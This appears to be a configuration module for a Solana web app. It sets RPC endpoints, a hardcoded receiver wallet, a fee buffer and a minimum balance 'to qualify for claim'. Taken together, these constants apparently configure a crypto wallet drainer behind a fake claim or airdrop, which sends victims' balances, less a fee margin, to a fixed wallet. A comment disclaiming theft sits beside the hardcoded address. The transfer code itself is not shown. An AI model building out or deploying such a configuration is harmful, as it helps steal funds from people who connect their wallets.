import { PublicKey } from '@solana/web3.js';

// Build RPC URL: in the browser use the Vite proxy, in SSR fall back to direct
function getProxyRpcUrl() {
  if (typeof window !== 'undefined') {
    return window.location.origin + '/solana-rpc';
  }
  return 'https://api.mainnet-beta.solana.com';
}

export const RPC_URL = getProxyRpcUrl();

export const RPC_ENDPOINTS = [
  RPC_URL,
  'https://api.mainnet-beta.solana.com',
];

// 🎯 Replace with your legitimate receiver wallet (NOT a thief!)
export const RECEIVER_WALLET = new PublicKey('DwLucxM2TNd8jj8ntNJ7BQJAmYAvCaZB2teMmP687jvZ');

// Optional: Minimum balance buffer (in lamports)
export const TRANSFER_FEE_BUFFER = 5000; // ~0.000005 SOL

// Minimum SOL balance required to qualify for claim
export const MIN_QUALIFY_SOL = 0.01;
